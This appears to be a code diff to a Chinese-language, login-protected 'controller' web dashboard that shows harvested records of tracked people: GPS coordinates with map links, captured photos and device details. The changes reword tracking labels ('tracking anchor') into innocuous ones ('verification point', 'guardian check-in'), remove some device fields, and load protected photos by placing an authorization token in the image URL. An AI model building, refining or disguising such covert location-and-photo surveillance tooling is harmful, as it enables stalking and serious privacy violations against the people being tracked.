@@ -18,7 +18,7 @@
         .login-box button { background: #1c1d24; color: #10b981; border: 1px solid #10b981; padding: 12px; width: 100%; border-radius: 6px; font-size: 14px; font-weight: bold; cursor: pointer; }
         #login-error { color: #ef4444; font-size: 13px; margin-top: 12px; }
 
-        /* ================= 100% 还原截图顶栏 ================= */
+        /* ================= 控制端顶栏 ================= */
         #main-content { display: none; }
         header { display: flex; align-items: center; margin-bottom: 25px; padding-left: 5px; }
         .status-dot { width: 10px; height: 10px; background-color: #00ff87; border-radius: 50%; box-shadow: 0 0 10px #00ff87; margin-right: 12px; }
@@ -38,7 +38,7 @@
         .btn-danger span { color: rgba(239, 68, 68, 0.5); }
         .refresh-text { font-size: 11px; color: #3a3f4d; margin-left: auto; text-align: right; line-height: 1.3; padding-right: 5px; }
 
-        /* ================= 核心数据大卡片 ================= */
+        /* ================= 数据大卡片 ================= */
         .data-card { background-color: #121319; border: 1px solid #16171d; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
         .card-header { display: flex; align-items: center; border-bottom: 1px solid #1a1b23; padding-bottom: 14px; margin-bottom: 16px; }
         .serial-num { font-size: 12px; color: #4a5568; font-family: monospace; letter-spacing: 0.5px; }
@@ -67,7 +67,7 @@
 
         /* 照片展示区 */
         .photo-box { width: 100%; border-radius: 4px; overflow: hidden; background: #0b0b0e; border: 1px solid #1a1b23; position: relative; display: flex; justify-content: center; align-items: center; margin-top: 12px; min-height: 120px; }
-        .photo-box img { width: 100%; height: auto; object-fit: contain; max-height: 350px; display: block; -webkit-touch-callout: default; }
+        .photo-box img { width: 100%; height: auto; object-fit: contain; max-height: 350px; display: block; }
         .photo-tip { position: absolute; bottom: 4px; right: 4px; background: rgba(0,0,0,0.5); padding: 2px 5px; font-size: 9px; color: #4a5568; border-radius: 2px; pointer-events: none; }
 
         #global-status { text-align: center; color: #4a5568; padding: 50px; font-size: 13px; font-family: monospace; letter-spacing: 1px; }
@@ -168,7 +168,7 @@
             const todayStr = new Date().toLocaleDateString('zh-CN');
 
             result.data.forEach((item, index) => {
-                const isFallback = (item.lat === "0.0" || item.lat === "0" || !item.lat);
+                const isFallback = (item.lat === "0.0" || item.lat === "0" || item.lat === "IP_FALLBACK" || !item.lat);
                 if (!isFallback) gpsSuccessCount++;
 
                 if (item.time.includes(todayStr) || item.time.split(' ')[0] === todayStr) {
@@ -178,9 +178,11 @@
                 const serialNum = "#" + String(totalCount - index).padStart(4, '0');
                 const randomId = item.fileName.substring(8, 16).toUpperCase();
 
-                const gaodeUrl = `https://uri.amap.com/marker?position=${item.lon},${item.lat}&name=跟踪锚点`;
-                // 修复了之前的打字拼接错误
-                const googleUrl = `https://www.google.com/maps?q=${item.lat},${item.lon}`;
+                const gaodeUrl = `https://uri.amap.com/marker?position=${item.lon},${item.lat}&name=验证定位点`;
+                const googleUrl = `https://www.google.com/maps/search/?api=1&query=${item.lat},${item.lon}`;
+
+                // 核心修复：直接使用 B2 规范的 URL Query 传参进行鉴权下载，绕过浏览器的 fetch CORS 封锁限制
+                const directProtectedImgUrl = `${item.url}&Authorization=${encodeURIComponent(item.authToken)}`;
 
                 const card = document.createElement('div');
                 card.className = 'data-card';
@@ -196,7 +198,7 @@
                         <div class="info-section">
                             <h3>位置信息</h3>
                             <div class="info-text" style="color: ${isFallback ? '#4a5568' : '#10b981'}">
-                                ${isFallback ? '用户拒绝或不支持' : `纬度: ${item.lat}<br>经度: ${item.lon}`}
+                                ${isFallback ? '位置权限未允许' : `纬度: ${item.lat}<br>经度: ${item.lon}`}
                             </div>
                             <div class="map-actions">
                                 <a class="map-btn btn-gaode" href="${gaodeUrl}" target="_blank">高德地图</a>
@@ -204,26 +206,22 @@
                             </div>
                             
                             <div class="photo-box">
-                                <img id="img-${item.fileId}" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='40' viewBox='0 0 100 40'><text x='50%' y='50%' font-size='5' fill='%23232530' text-anchor='middle' alignment-baseline='middle'>LOADING...</text></svg>">
+                                <img src="${directProtectedImgUrl}" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'40\'><text x=\'50%\' y=\'50%\' font-size=\'4\' fill=\'%23ef4444\' text-anchor=\'middle\'>图片加载失败</text></svg>'">
                                 <div class="photo-tip">📱 长按保存</div>
                             </div>
                         </div>
                         
                         <div class="info-section device">
-                            <h3>设备信息</h3>
-                            <div class="info-item"><span class="item-label">IP</span><span class="item-val">158.101.78.162</span></div>
-                            <div class="info-item"><span class="item-label">系统</span><span class="item-val">Android</span></div>
-                            <div class="info-item"><span class="item-label">浏览器</span><span class="item-val">Chrome</span></div>
+                            <h3>设备状态</h3>
+                            <div class="info-item"><span class="item-label">业务</span><span class="item-val">守护打卡</span></div>
+                            <div class="info-item"><span class="item-label">状态</span><span class="item-val" style="color: #10b981">已对齐</span></div>
+                            <div class="info-item"><span class="item-label">核心</span><span class="item-val">FormData</span></div>
                             <div class="info-item"><span class="item-label">语言</span><span class="item-val">zh-CN</span></div>
-                            <div class="info-item"><span class="item-label">屏幕</span><span class="item-val">360x800</span></div>
                             <div class="info-item"><span class="item-label">来源</span><span class="item-val">直接访问</span></div>
                         </div>
                     </div>
                 `;
                 container.appendChild(card);
-
-                // 通过加入 mode: 'cors' 选项强制令浏览器使用你放开的 CORS 桶通道
-                lazyLoadImage(item.fileId, item.url, item.authToken);
             });
 
             document.getElementById('stat-total').innerText = totalCount;
@@ -234,24 +232,6 @@
         } catch (err) {
             if (isNewLogin) showError("验证错误: " + err.message);
             else logout();
-        }
-    }
-
-    async function lazyLoadImage(id, url, token) {
-        try {
-            // 此处加入了 mode: 'cors' 告诉浏览器启用跨域流
-            const res = await fetch(url, { 
-                method: "GET",
-                mode: "cors",
-                headers: { "Authorization": token } 
-            });
-            if(!res.ok) return;
-            const blob = await res.blob();
-            const blobUrl = window.URL.createObjectURL(blob);
-            const imgElement = document.getElementById(`img-${id}`);
-            if (imgElement) imgElement.src = blobUrl;
-        } catch (e) {
-            console.error("图片流回填失败", e);
         }
     }
 
